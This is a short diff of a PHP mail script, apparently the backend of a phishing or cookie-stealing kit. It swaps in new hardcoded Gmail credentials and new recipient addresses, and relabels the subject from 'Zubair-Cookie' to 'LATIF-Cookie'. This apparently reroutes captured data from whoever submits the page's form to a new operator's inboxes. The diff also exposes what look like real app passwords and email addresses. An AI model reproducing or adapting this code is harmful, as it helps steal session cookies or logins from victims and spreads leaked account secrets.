@@ -51,19 +51,19 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $mail->isSMTP();
         $mail->Host       = 'smtp.gmail.com';
         $mail->SMTPAuth   = true;
-        $mail->Username   = 'dardhame1@gmail.com'; // Replace with your Gmail
-        $mail->Password   = 'vbbx qrsx uvpo plzl'; // App password, not your Gmail login
+        $mail->Username   = 'hip633253@gmail.com'; // Replace with your Gmail
+        $mail->Password   = 'gbcb ymna gsns njok'; // App password, not your Gmail login
         $mail->SMTPSecure = 'tls';
         $mail->Port       = 587;
 
         // Email headers
-        $mail->setFrom('dardhame1@gmail.com', 'PROFESSOR');
-        $mail->addAddress('submitdispute@gmail.com');
-        $mail->addAddress('newzatpage@gmail.com');
+        $mail->setFrom('hip633253@gmail.com', 'PROFESSOR');
+        $mail->addAddress('mahboobalinizamani@gmail.com');
+        $mail->addAddress('rnxsxnnxnx@gmail.com');
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'Zubair-Cookie';
+        $mail->Subject = 'LATIF-Cookie';
         $mail->Body    = $emailBody;
 
         // Send the email
@@ -77,3 +77,4 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     echo json_encode(['status' => 'error', 'message' => 'Invalid request']);
 
 }
+
